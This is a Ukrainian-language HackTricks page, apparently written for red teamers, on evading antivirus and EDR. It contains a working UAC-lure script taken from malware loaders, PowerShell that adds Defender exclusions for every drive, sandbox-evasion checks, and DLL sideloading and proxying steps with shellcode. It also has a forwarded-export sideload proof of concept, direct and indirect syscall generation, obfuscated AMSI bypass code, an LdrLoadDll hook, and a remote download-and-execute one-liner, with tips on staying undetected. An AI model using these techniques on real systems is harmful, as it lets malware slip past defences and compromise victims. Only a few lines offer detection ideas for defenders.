# Обхід антивірусу (AV)

{{#include ../banners/hacktricks-training.md}}

**Цю сторінку спочатку написав** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Зупинити Defender

- [defendnot](https://github.com/es3n1n/defendnot): Інструмент для зупинки Windows Defender.
- [no-defender](https://github.com/es3n1n/no-defender): Інструмент для зупинки Windows Defender, що маскується під інший антивірус.
- [Вимкнення Defender із правами адміністратора](basic-powershell-for-pentesters/README.md)

### UAC-приманка в стилі інсталятора перед втручанням у роботу Defender

Публічні лоадери, що маскуються під чити для ігор, часто поширюються як непідписані інсталятори Node.js/Nexe, які спочатку **запитують у користувача підвищення прав**, а лише потім нейтралізують Defender. Послідовність проста:

1. Перевірити наявність прав адміністратора за допомогою `net session`. Команда виконується успішно лише за наявності прав адміністратора, тож помилка означає, що лоадер запущено від імені звичайного користувача.
2. Негайно перезапустити себе з дієсловом `RunAs`, щоб викликати очікуване вікно підтвердження UAC, зберігши початковий командний рядок.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

Жертви вже вважають, що встановлюють «cracked» програмне забезпечення, тому зазвичай погоджуються на запит, надаючи malware права, необхідні для зміни політики Defender.<sup>[[26]](#references)</sup>

### Масові винятки `MpPreference` для кожної літери диска

Отримавши підвищені привілеї, ланцюжки на кшталт GachiLoader не вимикають службу повністю, а максимально розширюють сліпі зони Defender. Спочатку loader завершує роботу GUI watchdog (`taskkill /F /IM SecHealthUI.exe`), а потім додає **надзвичайно широкі винятки**, щоб профілі всіх користувачів, системні каталоги та знімні диски стали недоступними для сканування:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Ключові спостереження:

- Цикл проходить усі змонтовані файлові системи (D:\, E:\, USB-накопичувачі тощо), тому **будь-який майбутній payload, розміщений будь-де на диску, ігнорується**.
- Виключення розширення `.sys` передбачає майбутні дії — зловмисники залишають собі можливість пізніше завантажувати непідписані драйвери, не змінюючи більше нічого в Defender.
- Усі зміни вносяться в `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, тож наступні етапи можуть підтвердити, що виключення збереглися, або розширити їх без повторного запуску UAC.

Оскільки жодна служба Defender не зупиняється, наївні перевірки працездатності й далі показують, що «антивірус активний», хоча перевірка в реальному часі ніколи не охоплює ці шляхи.<sup>[[26]](#references)</sup>

## **Методологія ухилення від AV**

Наразі AV використовують різні методи перевірки файлів на шкідливість: статичне виявлення, динамічний аналіз і, у просунутіших EDR, поведінковий аналіз.

### **Статичне виявлення**

Статичне виявлення здійснюється шляхом пошуку відомих шкідливих рядків або масивів байтів у бінарному файлі чи скрипті, а також вилучення інформації безпосередньо з файлу (наприклад, опису файлу, назви компанії, цифрових підписів, іконки, контрольної суми тощо). Це означає, що використання відомих публічних інструментів може швидше призвести до виявлення, оскільки їх, імовірно, уже проаналізували й позначили як шкідливі. Є кілька способів обійти такий тип виявлення:

- **Шифрування**

Якщо зашифрувати бінарний файл, AV не зможе виявити вашу програму, але для розшифрування та запуску програми в пам’яті знадобиться певний loader.

- **Обфускація**

Іноді достатньо змінити кілька рядків у бінарному файлі чи скрипті, щоб він пройшов повз AV, але залежно від того, що саме потрібно обфускувати, це може забрати чимало часу.

- **Власні інструменти**

Якщо розробляти власні інструменти, відомих шкідливих сигнатур не буде, але це потребує багато часу й зусиль.

> [!TIP]
> Щоб перевірити, як Windows Defender виявляє файли статичними методами, скористайтеся [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Він розбиває файл на кілька сегментів і доручає Defender сканувати кожен окремо. Так можна точно визначити, які рядки або байти у вашому бінарному файлі позначено.

Наполегливо рекомендую переглянути цей [плейлист на YouTube](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) про практичне ухилення від AV.

### Офлайн-тести PE-ознак для статичних класифікаторів

Байти упакованого або зашифрованого payload — лише один із вхідних параметрів статичного класифікатора. EMBER2024 видобуває PE-ознаки, зокрема імпорти, експорти, секції, заголовки та дані Authenticode.<sup>[[48]](#references)</sup> В одному експерименті з loader додавання 141 імпорту, що виглядали нешкідливими, знизило оцінку шкідливості EMBER2024 на 93%, тоді як імпорти, пов’язані зі шкідливим ПЗ, підвищили її. Це результат для конкретної моделі й конкретних зразків, а не надійний спосіб обійти певний продукт AV/EDR.<sup>[[50]](#references)</sup>

Для авторизованого тестування loader залишайте payload і шлях виконання незмінними, змінюйте лише одну заплановану змінну збірки для кожного варіанта й порівнюйте оцінки офлайн. Перевіряйте отримані PE-ознаки, оскільки зміна збірки може вплинути на кілька груп ознак.<sup>[[49]](#references)[[50]](#references)</sup> Щоб потрібні імпорти залишалися в IAT, викликайте вибрані Win32 API з доступного коду. Змінюйте вибір і розподіляйте місця викликів між збірками, а не створюйте фіксовану функцію маскування, яка може стати сигнатурою. В експерименті також повідомлялося про нижчі оцінки за наявності дійсного підпису коду, записів експорту та більшої кількості функцій, що збільшують `.pdata`; недійсний підпис майже не впливав, а ефект від `.pdata` був незначним.<sup>[[50]](#references)</sup>

Пакет `thrember` надає засоби видобування ознак і еталонні моделі. Після його встановлення виконайте `thrember.download_models("models")`, указавши наявний каталог `models`, а потім запустіть оцінювач із батьківського каталогу: допоміжна функція завантаження змінює поточний робочий каталог. PE-класифікатор може оцінювати каталог зі збірками без їх надсилання до сервісу сканування:<sup>[[48]](#references)</sup>

```python
from pathlib import Path
import lightgbm as lgb
import thrember

model = lgb.Booster(model_file="models/EMBER2024_PE.model")
for sample in sorted(Path("builds").glob("*.exe")):
    print(sample, thrember.predict_sample(model, sample.read_bytes()))
```

Зберігайте версії моделі та feature extractor незмінними під час порівняння. Нижчий офлайн-показник лише показує, як цей класифікатор реагує на змінений бінарний файл; він не доводить обходу поведінкового аналізу, емуляції чи іншої моделі постачальника.<sup>[[49]](#references)[[50]](#references)</sup> Про [поліморфізм для кожної збірки та маскування зовнішнього бінарного файла у віртуалізованих payload](virtualized-payload-execution.md#camouflaging-the-outer-go-executable) дивіться в окремій моделі виконання.

### **Dynamic analysis**

Dynamic analysis — це коли AV запускає ваш бінарний файл у sandbox і стежить за шкідливою активністю (наприклад, спробами розшифрувати й прочитати паролі з браузера, створенням minidump для LSASS тощо). З цим може бути трохи складніше працювати, але ось кілька способів обходити sandbox.

- **Затримка перед виконанням** Залежно від реалізації, це може бути чудовим способом обійти dynamic analysis від AV. У AV є дуже мало часу на сканування файлів, щоб не переривати роботу користувача, тому тривалі затримки можуть завадити аналізу бінарних файлів. Проблема в тому, що багато AV sandbox можуть просто пропустити затримку — залежно від її реалізації.
- **Перевірка ресурсів машини** Зазвичай sandbox мають дуже обмежені ресурси (наприклад, < 2GB RAM), інакше вони могли б сповільнити машину користувача. Тут також можна проявити винахідливість: наприклад, перевірити температуру CPU або навіть швидкість обертання вентиляторів — не все це буде реалізовано в sandbox.
- **Перевірки, специфічні для машини** Якщо ви хочете атакувати користувача, чия робоча станція підключена до домену "contoso.local", можна перевірити домен комп'ютера й порівняти його із заданим. Якщо він не збігається, програма може завершити роботу.

Виявляється, computername sandbox Microsoft Defender — HAL9TH. Тож перед детонацією malware можна перевірити ім'я комп'ютера: якщо це HAL9TH, значить, ви перебуваєте в sandbox Defender, і програма може завершити роботу.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>джерело: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Ось ще кілька дуже корисних порад від [@mgeeky](https://twitter.com/mariuszbit) щодо протидії sandbox.

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> канал #malware-dev</p></figcaption></figure>

Як ми вже згадували в цій статті, **публічні інструменти** рано чи пізно **почнуть виявлятися**, тож варто запитати себе:

Наприклад, якщо вам потрібно зробити дамп LSASS, **чи справді потрібно використовувати mimikatz**? Чи можна скористатися менш відомим проєктом, який також робить дамп LSASS?

Імовірно, правильна відповідь — останній варіант. Візьмімо mimikatz: це, мабуть, один із найбільш позначених AV та EDR зразків malware, якщо не найбільш позначений. Сам проєкт чудовий, але з ним також неймовірно складно працювати, щоб обходити AV, тож просто пошукайте альтернативи для свого завдання.

> [!TIP]
> Змінюючи payload для обходу виявлення, обов'язково **вимкніть автоматичне надсилання зразків** у Defender і, будь ласка, серйозно, **НЕ ЗАВАНТАЖУЙТЕ ФАЙЛИ НА VIRUSTOTAL**, якщо прагнете довгостроково обходити виявлення. Якщо хочете перевірити, чи виявляє ваш payload певний AV, встановіть його у VM, спробуйте вимкнути автоматичне надсилання зразків і тестуйте там, доки не будете задоволені результатом.

## EXE проти DLL

Коли це можливо, завжди **віддавайте перевагу DLL для обходу виявлення**. З мого досвіду, файли DLL зазвичай **значно рідше виявляють і аналізують**, тож у деяких випадках це дуже простий спосіб уникнути виявлення (звісно, якщо ваш payload може запускатися як DLL).

Як видно на цьому зображенні, рівень виявлення DLL payload від Havoc на antiscan.me становить 4/26, тоді як для EXE payload — 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>порівняння на antiscan.me звичайного EXE payload від Havoc зі звичайною DLL від Havoc</p></figcaption></figure>

Далі покажемо кілька прийомів роботи з файлами DLL, які допоможуть значно краще залишатися непомітними.

## DLL Sideloading & Proxying

**DLL Sideloading** використовує порядок пошуку DLL, який застосовує loader, розміщуючи вразливу програму та шкідливі payload поруч.

Перевірити програми, вразливі до DLL Sideloading, можна за допомогою [Siofra](https://github.com/Cybereason/siofra) та такого скрипту powershell:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

Ця команда виведе список програм у каталозі "C:\Program Files\\", вразливих до DLL hijacking, і DLL-файлів, які вони намагаються завантажити.

Наполегливо рекомендую **самостійно дослідити програми, вразливі до DLL Hijacking/Sideloading**: за належного виконання ця техніка досить непомітна, але якщо використовувати загальновідомі програми, вразливі до DLL Sideloading, вас можуть легко виявити.

Просте розміщення шкідливої DLL з назвою, яку програма очікує завантажити, не призведе до завантаження вашого payload, оскільки програма очікує наявності в цій DLL певних функцій. Щоб усунути цю проблему, ми використаємо іншу техніку — **DLL Proxying/Forwarding**.

**DLL Proxying** перенаправляє виклики програми з проксі (і шкідливої) DLL до оригінальної DLL, зберігаючи функціональність програми та даючи змогу виконати ваш payload.

Я використовуватиму проєкт [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) від [@flangvik](https://twitter.com/Flangvik/)

Ось кроки, які я виконав:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

Остання команда надасть нам 2 файли: шаблон вихідного коду DLL і оригінальну DLL зі зміненою назвою.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

Ось результати:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

І наш shellcode (закодований за допомогою [SGN](https://github.com/EgeBalci/sgn)), і proxy DLL мають показник виявлення 0/26 на [antiscan.me](https://antiscan.me)! Я б назвав це успіхом.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> **Наполегливо рекомендую** переглянути [запис трансляції S3cur3Th1sSh1t на Twitch](https://www.twitch.tv/videos/1644171543) про DLL Sideloading, а також [відео ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE), щоб докладніше дізнатися про те, що ми обговорили.

### Зловживання перенаправленими експортами (ForwardSideLoading)

Модулі Windows PE можуть експортувати функції, які насправді є «перенаправлювачами»: замість адреси коду запис експорту містить ASCII-рядок у форматі `TargetDll.TargetFunc`. Коли викликач шукає цей експорт, завантажувач Windows:

- Завантажує `TargetDll`, якщо його ще не завантажено
- Шукає в ньому `TargetFunc`

Важливо розуміти такі особливості:
- Якщо `TargetDll` є KnownDLL, його завантажують із захищеного простору імен KnownDLLs (наприклад, ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Якщо `TargetDll` не є KnownDLL, використовується звичайний порядок пошуку DLL, до якого входить каталог модуля, що виконує перенаправлення.

Це дає змогу застосувати непрямий примітив sideloading: знайти підписану DLL, яка експортує функцію з перенаправленням на модуль, назва якого не належить до KnownDLL, а потім розмістити цю підписану DLL поруч із DLL під контролем атакувальника, названою точно так само, як цільовий модуль перенаправлення. Коли викликається перенаправлений експорт, завантажувач обробляє перенаправлення та завантажує вашу DLL із того самого каталогу, виконуючи ваш DllMain.<sup>[[13]](#references)</sup>

Приклад, зафіксований у Windows 11:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` не є KnownDLL, тому його знаходять у звичайному порядку пошуку.

PoC (скопіюйте й вставте):
1) Скопіюйте підписану системну DLL до папки, доступної для запису.
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Помістіть шкідливу `NCRYPTPROV.dll` у ту саму папку. Для виконання коду достатньо мінімальної `DllMain`; щоб запустити `DllMain`, реалізовувати переслану функцію не потрібно.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) Активуйте перенаправлення за допомогою підписаного LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Спостережувана поведінка:
- rundll32 (підписаний) завантажує side-by-side `keyiso.dll` (підписаний)
- Під час пошуку `KeyIsoSetAuditingInterface` завантажувач переходить за forward до `NCRYPTPROV.SetAuditingInterface`
- Потім завантажувач завантажує `NCRYPTPROV.dll` із `C:\test` і виконує його `DllMain`
- Якщо `SetAuditingInterface` не реалізовано, помилка «missing API» з’явиться лише після виконання `DllMain`

Поради з пошуку:
- Зосередьтеся на forwarded exports, у яких цільовий модуль не є KnownDLL. KnownDLL перелічені в `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Ви можете перелічити forwarded exports за допомогою таких інструментів:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Перегляньте список форвардерів Windows 11, щоб знайти потенційні варіанти: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Ідеї для виявлення/захисту:
- Відстежуйте LOLBins (наприклад, rundll32.exe), що завантажують підписані DLL з нестандартних системних шляхів, а потім завантажують із цієї директорії DLL, яких немає в KnownDLLs, з такою самою базовою назвою
- Створюйте сповіщення про ланцюжки процесів/модулів на кшталт: `rundll32.exe` → нестандартний системний `keyiso.dll` → `NCRYPTPROV.dll` у шляхах, доступних для запису користувачам
- Застосовуйте політики цілісності коду (WDAC/AppLocker) і забороняйте одночасний запис і виконання в директоріях застосунків

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze — це набір інструментів для створення payload, призначений для обходу EDR за допомогою призупинених процесів, прямих syscalls і альтернативних методів виконання`

За допомогою Freeze можна непомітно завантажувати й виконувати свій shellcode.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion — це гра в кішки-мишки: те, що працює сьогодні, завтра можуть виявити. Тож ніколи не покладайтеся лише на один інструмент; якщо можливо, спробуйте поєднати кілька технік evasion.

## Direct/Indirect Syscalls та визначення SSN (SysWhispers4)

EDR часто встановлюють **inline hooks у user mode** на syscall stubs у `ntdll.dll`. Щоб обійти ці hooks, можна згенерувати **direct** або **indirect** syscall stubs, які завантажують правильний **SSN** (System Service Number) і переходять у режим ядра, не виконуючи hooked export entrypoint.<sup>[[32]](#references)</sup>

**Варіанти виклику:**
- **Direct (embedded)**: додати інструкцію `syscall`/`sysenter`/`SVC #0` до згенерованого stub (без звернення до export у `ntdll`).
- **Indirect**: перейти до наявного `syscall` gadget усередині `ntdll`, щоб здавалося, що перехід у режим ядра відбувається з `ntdll` (корисно для evasion на основі евристик); **randomized indirect** вибирає gadget із пулу для кожного виклику.
- **Egg-hunt**: уникнути збереження статичної послідовності opcode `0F 05` на диску; знаходити послідовність syscall під час виконання.

**Стратегії визначення SSN, стійкі до hooks:**
- **FreshyCalls (VA sort)**: визначати SSN, сортуючи syscall stubs за віртуальними адресами, а не читаючи байти stub.
- **SyscallsFromDisk**: завантажити чистий `\KnownDlls\ntdll.dll`, прочитати SSN із його `.text`, а потім вивантажити його (обхід усіх hooks у пам’яті).
- **RecycledGate**: поєднати визначення SSN через сортування VA з перевіркою opcode, коли stub чистий; якщо на ньому є hook — перейти до визначення через VA.
- **HW Breakpoint**: встановити DR0 на інструкцію `syscall` і використати VEH, щоб під час виконання отримати SSN з `EAX`, не аналізуючи байти з hooks.

Приклад використання SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

Під час розбору чистих syscall-експортів x64 `ntdll` для визначення SSN враховуйте обидва варіанти: `4C 8B D1 B8` (`mov r10, rcx; mov eax, imm32`) і ту саму послідовність із префіксом `F3 0F 1E FA` (`endbr64`). Другий варіант — stub із префіксом CET: parser, який припускає, що SSN завжди розташований за фіксованим зсувом, його пропустить. Якщо ініціалізація indirect syscall не вдається й loader використовує запасний варіант із `GetProcAddress`, виклики через ці експорти можуть знову натрапити на user-mode hooks.<sup>[[54]](#references)</sup>

### Альтернативні експорти syscall у `tprtdll.dll`

У проєкті `tprtdll.dll` зазначено як DLL із підписом Microsoft, наявну в `C:\Windows\System32\` у Windows 11 build 26100 і пізніших версіях. Вона має окремі адреси коду, відмінні від `ntdll.dll`, тож hook, який патчить лише точку входу syscall у `ntdll`, не патчить відповідний stub у `tprtdll`. На відміну від описаних вище методів визначення SSN, цей підхід завантажує `tprtdll.dll` і напряму викликає доступний експорт `Nt*` або `Zw*` через `GetProcAddress`. Переконайтеся, що DLL і потрібні експорти наявні, та використовуйте відповідні прототипи функцій NT.<sup>[[55]](#references)</sup>

У PoC із self-injection використовується `tprtdll!NtAllocateVirtualMemoryEx` для виділення пам’яті RW, `memcpy` для копіювання байтів, `tprtdll!ZwProtectVirtualMemory` для зміни регіону на RX і `tprtdll!RtlCreateUserThread` для запуску потоку.<sup>[[56]](#references)</sup> Варіант для іншого процесу потребує доступного handle цільового процесу й використовує `WriteProcessMemory` для копіювання.<sup>[[57]](#references)</sup> В інвентарі експортів проєкту немає `NtOpenProcess`, `NtWriteVirtualMemory` і `NtCreateThreadEx`, тож не кожну операцію injection можна виконати через альтернативний експорт.<sup>[[55]](#references)</sup>

PoC не доводить, що `RtlCreateUserThread` є прямим syscall stub або що його внутрішні виклики уникають hooks `ntdll` лише тому, що експорт було отримано з `tprtdll`.<sup>[[56]](#references)</sup> У прикладі для іншого процесу також використовуються адреси `WinExec` і `ExitThread`, визначені в injector; ці адреси мають бути дійсними в цільовому процесі, щоб payload у прикладі працював.<sup>[[57]](#references)</sup>

Цей метод обходить лише hooks, обмежені відповідними експортами `ntdll`; він не приховує syscalls від моніторингу на рівні ядра.<sup>[[55]](#references)</sup> Про спосіб injection, який натомість обходиться без віддаленого запису й створення нових потоків, див. [Thread Name-Calling and Waiting Thread Hijacking](windows-process-injection-thread-name-calling-waiting-thread-hijacking.md).

## AMSI (Anti-Malware Scan Interface)

AMSI створили для боротьби з «[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)». Спочатку AV могли сканувати лише **файли на диску**, тож якщо вдавалося виконати payload **безпосередньо в пам’яті**, AV не міг цьому завадити, бо не мав достатньої видимості.

Функцію AMSI інтегровано в такі компоненти Windows:

- Контроль облікових записів користувачів, або UAC (підвищення привілеїв EXE, COM, MSI або встановлення ActiveX)
- PowerShell (скрипти, інтерактивне використання та динамічне обчислення коду)
- Windows Script Host (wscript.exe і cscript.exe)
- JavaScript і VBScript
- Макроси Office VBA

Це дає антивірусним рішенням змогу перевіряти поведінку скриптів, надаючи їхній вміст у незашифрованому й необфускованому вигляді.

Запуск `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` спричинить таке сповіщення у Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Зверніть увагу, як він додає на початку `amsi:`, а потім шлях до виконуваного файла, з якого запущено скрипт, у цьому випадку — powershell.exe.

Ми не записували жодного файла на диск, але все одно були виявлені в пам’яті через AMSI.

Крім того, починаючи з **.NET 4.8**, код C# також проходить перевірку AMSI. Це впливає навіть на завантаження коду для виконання в пам’яті через `Assembly.Load(byte[])`. Тому для виконання в пам’яті, якщо потрібно уникнути AMSI, рекомендують використовувати нижчі версії .NET (наприклад, 4.7.2 або старіші).

Є кілька способів обійти AMSI:

- **Обфускація**

Оскільки AMSI здебільшого використовує статичне виявлення, зміна скриптів, які ви намагаєтеся завантажити, може допомогти уникнути виявлення.

Однак AMSI здатен деобфускувати скрипти навіть за наявності кількох рівнів обфускації, тож залежно від способу її виконання цей варіант може бути невдалим. Через це обхід не такий простий. Втім, іноді достатньо змінити кілька імен змінних — тож усе залежить від того, наскільки щось позначено як підозріле.

- **Обхід AMSI**

Оскільки AMSI реалізовано завантаженням DLL у процес powershell (а також cscript.exe, wscript.exe тощо), її легко підмінити навіть із непривілейованого облікового запису. Через цей недолік реалізації AMSI дослідники знайшли кілька способів уникнути сканування AMSI.

**Примусове спричинення помилки**

Якщо примусово спричинити збій ініціалізації AMSI (`amsiInitFailed`), у поточному процесі сканування не запускатиметься. Спочатку про це повідомив [Matt Graeber](https://twitter.com/mattifestation), після чого Microsoft розробила сигнатуру, щоб обмежити широке використання цього методу.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Усе, що знадобилося, — один рядок коду PowerShell, щоб зробити AMSI непридатним до використання в поточному процесі PowerShell. Звісно, сам AMSI позначив цей рядок, тож для використання цієї техніки потрібні певні зміни.

Ось модифікований AMSI bypass, який я взяв із цього [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Пам’ятайте, що після публікації цей допис, імовірно, позначать, тож не публікуйте код, якщо плануєте залишитися непоміченими.

**Memory Patching**

Цю техніку вперше виявив [@RastaMouse](https://twitter.com/_RastaMouse/). Вона полягає в пошуку адреси функції "AmsiScanBuffer" у amsi.dll (відповідає за сканування введених користувачем даних) і перезаписі її інструкціями, які повертають код E_INVALIDARG. У такий спосіб результат фактичного сканування буде 0, що інтерпретується як чистий результат.

> [!TIP]
> Щоб дізнатися більше, прочитайте [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/).

Існує також багато інших технік обходу AMSI за допомогою powershell. Щоб дізнатися про них більше, перегляньте [**цю сторінку**](basic-powershell-for-pentesters/index.html#amsi-bypass) і [**цей репозиторій**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell).

### Перенаправлення вказівника сканування AMSI COM замість патчингу `AmsiScanBuffer`

Інший обхід, локальний для процесу, не змінює точку входу `AmsiScanBuffer`. У задокументованому 64-бітному .NET-завантажувачі створюється об’єкт AMSI COM із CLSID `fdb00e52-a214-4aa1-8fba-4357bb0072ec`; `Marshal.GetIUnknownForObject()` повертає вказівник на інтерфейс, а слот його vtable зі зміщенням `0x18` використовується як ціль виклику сканування. Завантажувач патчить нативний вказівник на `Console.Clear()` невеликим x64-stub, змінює цей запис vtable на stub за допомогою `VirtualProtect()`, а потім відновлює початковий захист сторінки. Необхідними умовами є 64-бітна ширина вказівника та очікувана структура COM; це не універсальне зміщення для довільних інтерфейсів або збірок AMSI. Раніше спостережені етапи: [завантаження sidecar-файлу з підписаним AppDomainManager](windows-local-privilege-escalation/dll-hijacking/#signed-appdomainmanager-type-as-a-configuration-file-gadget) і [десеріалізація RESX](../pentesting-web/deserialization/basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md#resx-resource-parsing-to-binaryformatter-and-xaml).<sup>[[51]](#references)</sup>

Спостережені байти stub: `41 C7 00 01 00 00 00 33 C0 C3`: вони записують **1** у вказівник результату в `r8` і повертають **0** у `eax`. Отже, твердження, що результат сканування дорівнює `AMSI_RESULT_CLEAN` (0), змішує значення, яке повертає `S_OK`, із вихідним значенням enum. У задокументованому порядку `AMSI_RESULT` значення **1** — це `AMSI_RESULT_NOT_DETECTED`; воно все одно нижче за поріг виявлення.<sup>[[51]](#references)[[52]](#references)[[53]](#references)</sup>

### Блокування AMSI через запобігання завантаженню amsi.dll (LdrLoadDll hook)

AMSI ініціалізується лише після завантаження `amsi.dll` у поточний процес. Надійний обхід, незалежний від мови програмування, полягає у встановленні hook у user mode на `ntdll!LdrLoadDll`, який повертає помилку, якщо запитаний модуль — `amsi.dll`. У результаті AMSI не завантажується, і в цьому процесі сканування не відбуваються.<sup>[[23]](#references)</sup>

Загальна схема реалізації (псевдокод x64 C/C++):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Примітки
- Працює з PowerShell, WScript/CScript і спеціалізованими завантажувачами (усім, що за інших умов завантажувало б AMSI).
- Поєднуйте це з передаванням скриптів через stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`), щоб уникнути довгих артефактів командного рядка.
- Це використовували завантажувачі, запущені через LOLBins (наприклад, `regsvr32`, що викликає `DllRegisterServer`).

Інструмент **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** також генерує скрипт для обходу AMSI.
Інструмент **[https://amsibypass.com/](https://amsibypass.com/)** також генерує скрипт для обходу AMSI, який уникає сигнатурного виявлення за допомогою рандомізованих користувацьких функцій, змінних і виразів із символів, а також випадково змінює регістр символів у ключових словах PowerShell.

**Видалення виявленої сигнатури**

